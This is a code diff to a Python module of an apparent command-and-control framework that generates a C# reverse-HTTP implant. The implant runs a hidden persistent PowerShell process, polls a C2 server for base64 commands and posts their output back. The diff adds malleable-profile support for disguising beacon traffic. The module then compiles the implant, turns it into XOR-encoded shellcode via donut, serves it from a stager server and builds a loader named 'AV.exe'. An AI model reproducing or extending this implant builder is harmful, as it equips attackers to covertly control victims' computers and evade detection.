@@ -1,12 +1,16 @@
 import base64
 import os
 import tempfile
+import json
 import subprocess
 import shutil
 from pathlib import Path
 from core.payload_generator.common import payload_utils as payutils
 from core.payload_generator.common.payload_utils import XorEncode
 from core.payload_generator.windows.http.exe import build_make
+from core.malleable_engine.registry import PARSERS, LOADERS
+import core.malleable_engine
+from core.malleable_engine.base import load_plugins
 from core import stager_server as stage
 from colorama import init, Fore, Style
 
@@ -15,8 +19,88 @@ brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
 brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
 brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
+load_plugins()  # auto-register parsers/loaders
 
-def make_raw(ip, port):
+def _cs_escape(s: str) -> str:
+	return s.replace("\\", "\\\\").replace('"','\\"')
+
+def _emit_header_lines(headers: dict, var: str, is_post: bool=False) -> str:
+	lines = []
+	for k, v in (headers or {}).items():
+		if is_post and k.lower() == "content-type":
+			lines.append(f'{var}.ContentType = "{_cs_escape(v)}";')
+		else:
+			lines.append(f'{var}.Headers.Add("{_cs_escape(k)}", "{_cs_escape(v)}");')
+	return "\n".join(lines)
+
+def _emit_post_json_expr(mapping: dict | None) -> str:
+	#env = (envelope or "base64-json").lower()
+	m = mapping or {"output": "{{payload}}"}
+	templ = json.dumps(m, separators=(",", ":"), ensure_ascii=False)
+	templ = _cs_escape(templ)
+	repl = "\" + outB64 + \""
+	templ = templ.replace("{{payload}}", repl)
+	return f"\"{templ}\""
+
+
+def make_raw(ip, port, cfg=None, scheme="http"):
+	base_url = f"{scheme}://{ip}:{port}"
+	if cfg:
+		print(cfg)
+		ua = cfg.useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+		get_url  = base_url.rstrip("/") + cfg.get_uri
+		post_url = base_url.rstrip("/") + cfg.post_uri
+		get_headers  = _emit_header_lines(cfg.headers_get, "getReq", is_post=False)
+		post_headers = _emit_header_lines(cfg.headers_post, "postReq", is_post=True)
+		accept_line = f'getReq.Accept = "{_cs_escape(cfg.accept)}";' if cfg.accept else ""
+		host_line   = f'getReq.Host = "{_cs_escape(cfg.host)}";'     if cfg.host else ""
+		range_line  = f'getReq.AddRange(0, {int(cfg.byte_range)});'  if cfg.byte_range else ""
+		accept_post = f'postReq.Accept = "{_cs_escape(cfg.accept_post)}";' if cfg.accept_post else ""
+		host_post = f'postReq.Host = "{_cs_escape(cfg.host_post)}";' if cfg.host_post else ""
+		# we keep your two sleeps but drive them from interval if provided
+		sleep_short = int((cfg.interval_ms or 2000) * 0.5)
+		if cfg.interval_ms:
+			cfg.interval_ms = int(cfg.interval_ms) * 1000
+
+		sleep_long  = int(cfg.interval_ms or 5000)
+		# build extraction regex union from mapping
+		probe_keys = []
+
+		def _collect(d, path):
+			for k, v in d.items():
+				if isinstance(v, dict):
+					_collect(v, path + [k])
+				elif isinstance(v, str) and "{{payload}}" in v:
+					probe_keys.append(".".join(path + [k]))
+
+		_collect(cfg.get_server_mapping or {}, [])
+
+		regexes = [
+			f'\"{_cs_escape(k.split(".")[-1])}\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"'
+			for k in probe_keys
+		]
+
+		regexes += [
+			'\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
+			'\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
+			'\"output\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"',
+		]
+
+		probe_union = "|".join(f"(?:{r})" for r in regexes)
+
+		post_json_expr = _emit_post_json_expr(getattr(cfg, "post_client_mapping", None))
+
+	else:
+		# legacy hardcoded defaults
+		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+		get_url = post_url = f"{base_url}/"
+		get_headers = post_headers = ""
+		accept_line = host_line = range_line = ""
+		accept_post = ""
+		sleep_short, sleep_long = 2000, 5000
+		probe_union = '\\"Telemetry\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"|(?:\\"cmd\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\")'
+		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'
+
 	payload = f"""
 
 using System;
@@ -34,8 +118,9 @@ class Program
 		// 1) Generate a persistent SID
 		string sid = GenerateSid();
 
-		// 2) C2 endpoint
-		string url = "http://{ip}:{port}/";
+		// 2) Endpoints (profile-aware)
+		string getUrl  = "{_cs_escape(get_url)}";
+		string postUrl = "{_cs_escape(post_url)}";
 
 		// 3) Start a hidden, persistent PowerShell process
 		var psi = new ProcessStartInfo {{
@@ -67,10 +152,15 @@ class Program
 
 			try
 			{{
-				var getReq = (HttpWebRequest)WebRequest.Create(url);
+				var getReq = (HttpWebRequest)WebRequest.Create(getUrl);
 				getReq.Method    = "GET";
-				getReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+				getReq.Proxy = null;
+				getReq.UserAgent = "{_cs_escape(ua)}";
 				getReq.Headers.Add("X-Session-ID", sid);
+				{accept_line}
+				{host_line}
+				{range_line}
+				{get_headers}
 
 				string body;
 				using (var getResp = (HttpWebResponse)getReq.GetResponse())
@@ -106,13 +196,15 @@ class Program
 
 				var outBytes = Encoding.UTF8.GetBytes(outRaw);
 				var outB64   = Convert.ToBase64String(outBytes);
-				var json     = "{{\\"output\\":\\"" + outB64 + "\\"}}";
+				var json = {post_json_expr};
 
-				var postReq = (HttpWebRequest)WebRequest.Create(url);
+				var postReq = (HttpWebRequest)WebRequest.Create(postUrl);
 				postReq.Method      = "POST";
-				postReq.UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
-				postReq.ContentType = "application/json; charset=UTF-8";
+				postReq.Proxy = null;
+				postReq.UserAgent   = "{_cs_escape(ua)}";
+				postReq.ContentType = "application/json";
 				postReq.Headers.Add("X-Session-ID", sid);
+				{post_headers}
 
 				var postData = Encoding.UTF8.GetBytes(json);
 				postReq.ContentLength = postData.Length;
@@ -129,7 +221,7 @@ class Program
 			{{
 			}}
 
-			Thread.Sleep(5000);
+			Thread.Sleep({sleep_long});
 		}}
 	}}
 
@@ -167,17 +259,12 @@ class Program
 
 	static string ParseTelemetry(string resp)
 	{{
-		var m = Regex.Match(resp, "\\"Telemetry\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"");
-		if (m.Success)
-		{{
+		var m = Regex.Match(resp, "{_cs_escape(probe_union)}");
+		if (m.Success) {{
 			return m.Groups["b64"].Value;
+		}} else {{
+			return null;
 		}}
-		m = Regex.Match(resp, "\\"cmd\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"");
-		if (m.Success)
-		{{
-			return m.Groups["b64"].Value;
-		}}
-		return null;
 	}}
 }}
 """
@@ -186,8 +273,34 @@ class Program
 
 
 def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent, stager_ip="0.0.0.0", stager_port=9999,
-	accept=None, byte_range=None, jitter=None, profile=None):
-	raw = make_raw(ip, port)
+	accept=None, byte_range=None, jitter=None, profile=None, parser_name="json", loader_name="exe_csharp_http_profile_loader", scheme="http"):
+	
+	# Parse → Load → Config for this emitter
+	cfg = None
+	if profile:
+		parser_cls = PARSERS.get(parser_name)
+		loader_cls = LOADERS.get(loader_name)
+		print(f"PARSERS: {PARSERS}, LOADERS: {LOADERS}")
+		if not parser_cls or not loader_cls:
+			raise ValueError(f"Parser/Loader not found: {parser_name}/{loader_name}")
+		prof = parser_cls().parse(profile)
+		if prof is None:
+			raise ValueError(f"Invalid profile: {profile}")
+		defaults = {
+			"headers": headers or {},
+			"useragent": useragent,
+			"accept": accept,
+			"host": (headers or {}).get("Host"),
+			"byte_range": byte_range,
+			"interval": beacon_interval,
+			"jitter": jitter,
+			"port": port,
+			"transport": scheme,
+		}
+		cfg = loader_cls().load(prof, defaults=defaults)
+
+	raw = make_raw(ip, port, cfg=cfg, scheme=scheme)
+	#print(raw)
 
 	# 2) write to temp .c file
 	fd, c_path = tempfile.mkstemp(suffix=".cs", text=True)
@@ -205,7 +318,7 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 			c_path
 		]
 		#print(f"[+] Compiling payload: {' '.join(cmd)}")
-		subprocess.run(cmd)
+		subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 		# 4) run donut to produce shellcode blob (format=raw)
 		sc_path = c_path[:-2] + ".bin"
@@ -213,7 +326,7 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
 		donut_cmd = [donut, "-b", "1", "-f", "3", "-a", "2", "-o", sc_path, "-i", exe_path]
 		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
-		subprocess.run(donut_cmd) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+		subprocess.run(donut_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
 
 		# 5) read the shellcode blob into memory
 		try:
@@ -239,19 +352,19 @@ def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent
 		#encoder.shellcode = bytearray(shellcode)
 		length = len(shellcode)
 		#print("AFTER length")
-		print("MAKING TEMP FILES FOR XOR ENCODE")
+		#print("MAKING TEMP FILES FOR XOR ENCODE")
 
 		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
 		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
 		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
-		print(f"BUILT PAYLOAD OF TYPE {type(payload)}")
+		#print(f"BUILT PAYLOAD OF TYPE {type(payload)}")
 		out = Path.cwd() / "AV.exe"
-		print("STARTING STAGER SERVER")
-		print(f"IP: {stager_ip}, PORT: {stager_port}")
-		print(f"PORT: {type(stager_port)}, PAYLOAD: {type(payload)}, IP, {type(stager_ip)}")
+		#print("STARTING STAGER SERVER")
+		#print(f"IP: {stager_ip}, PORT: {stager_port}")
+		#print(f"PORT: {type(stager_port)}, PAYLOAD: {type(payload)}, IP, {type(stager_ip)}")
 		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
-		print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
-		print("RUNNING BUILD")
+		#print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
+		#print("RUNNING BUILD")
 		build_status = build_make.build(out, payload, stager_ip, stager_port)
 		if build_status:
 			return True
